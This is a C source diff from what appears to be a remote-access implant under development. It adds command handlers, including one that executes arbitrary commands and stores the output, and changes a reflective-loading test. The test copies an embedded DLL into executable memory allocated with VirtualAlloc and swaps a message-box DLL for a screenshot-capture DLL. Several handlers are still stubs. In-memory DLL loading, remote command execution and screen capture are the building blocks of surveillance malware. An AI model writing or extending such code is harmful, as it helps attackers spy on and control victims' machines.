@@ -8,6 +8,7 @@
 #include "commandlist.h"
 #include "common.h"
 #include "messagebox.h"
+#include "screenshot.h"
 
 #define CURL_STATICLIB
 #include "tinycurl\include\curl\curl.h"
@@ -42,28 +43,31 @@ struct MemoryStruct {
 char* STORED_RESPONSE = NULL;
 
 // Built-in Commands
-void CMD_exec(char* args)
+char* CMD_exec(char* args)
 {
     STORED_RESPONSE = execute_command(args);
     printf("Command: %s\nResult: %s\n", args, STORED_RESPONSE);
+    return NULL;
 }
 
-void CMD_shell(char* args)
+char* CMD_shell(char* args)
 {
     MessageBox(NULL, "Received shell command", "Shell Command", MB_OK);
+    return NULL;
 }
 
-void CMD_load(char* args)
+char* CMD_load(char* args)
 {
     printf("Received load command with arguments: %s\n", args);
+    return NULL;
 }
 
-void CMD_quit(char* args)
+char* CMD_quit(char* args)
 {
     exit(0);
 }
 
-void CMD_install(char* args)
+char* CMD_install(char* args)
 {
     FILE *fp = fopen("installed.txt", "w");
     if (fp != NULL)
@@ -71,6 +75,7 @@ void CMD_install(char* args)
         fprintf(fp, "Installed\n");
         fclose(fp);
     }
+    return NULL;
 }
 
 // Callback function to handle incoming data
@@ -105,18 +110,19 @@ size_t WriteMemoryCallback(void *ptr, size_t size, size_t nmemb, void *clientp)
 
 // TEST CODE
 typedef void (*ShowMessageBoxFunc)(char*);
-typedef CommandNode* (*CommandNodePointer)(void);
 
 void ReflectiveTest(void)
 {
     LPVOID lpBuffer = NULL;
     HANDLE hModule  = NULL;
 
-    lpBuffer = VirtualAlloc(NULL, messageboxdll_dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    // lpBuffer = VirtualAlloc(NULL, messageboxdll_dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    lpBuffer = VirtualAlloc(NULL, screenshot_dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if( !lpBuffer )
 		BREAK_WITH_ERROR( "Failed to allocate space" );
 
-    memcpy(lpBuffer, messageboxdll_dll, messageboxdll_dll_len);
+    // memcpy(lpBuffer, messageboxdll_dll, messageboxdll_dll_len);
+    memcpy(lpBuffer, screenshot_dll, screenshot_dll_len);
     printf("memcpy\n");
     fflush(stdout);
 
@@ -127,7 +133,8 @@ void ReflectiveTest(void)
     
     CommandNode* tester = func();
     printf("Tester: %s\n", tester->command);
-    tester->function("Wow");
+    STORED_RESPONSE = tester->function("some args");
+    printf("Done with reflective test.\n");
 }
 // END TEST CODE
 
